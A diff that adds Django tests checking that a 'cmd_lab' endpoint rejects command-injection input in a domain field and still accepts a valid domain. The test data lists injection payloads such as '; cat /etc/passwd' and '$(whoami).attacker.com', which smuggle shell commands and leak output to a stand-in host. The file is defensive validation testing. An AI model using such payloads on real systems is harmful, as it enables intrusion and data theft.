@@ -94,3 +94,31 @@ class PlatformRegressionTests(TestCase):
         )
         self.assertEqual(r.status_code, 302)
         self.assertEqual(self.client.get("/").status_code, 200)
+
+    def test_cmd_lab_rejects_malicious_domain(self):
+        """Command injection payloads must be rejected with invalid domain message."""
+        self.client.force_login(self.user)
+        malicious_inputs = [
+            "example.com; cat /etc/passwd",
+            "example.com && whoami",
+            "$(whoami).attacker.com",
+            "`id`",
+            "example.com | ls",
+        ]
+        for payload in malicious_inputs:
+            r = self.client.post(
+                "/cmd_lab",
+                {"domain": payload, "os": "linux"},
+            )
+            self.assertEqual(r.status_code, 200, msg=payload)
+            self.assertContains(r, "Invalid domain name", msg_prefix=payload)
+
+    def test_cmd_lab_accepts_valid_domain(self):
+        """Valid domain names should be accepted (not rejected by allowlist)."""
+        self.client.force_login(self.user)
+        r = self.client.post(
+            "/cmd_lab",
+            {"domain": "example.com", "os": "linux"},
+        )
+        self.assertEqual(r.status_code, 200)
+        self.assertNotContains(r, "Invalid domain name")
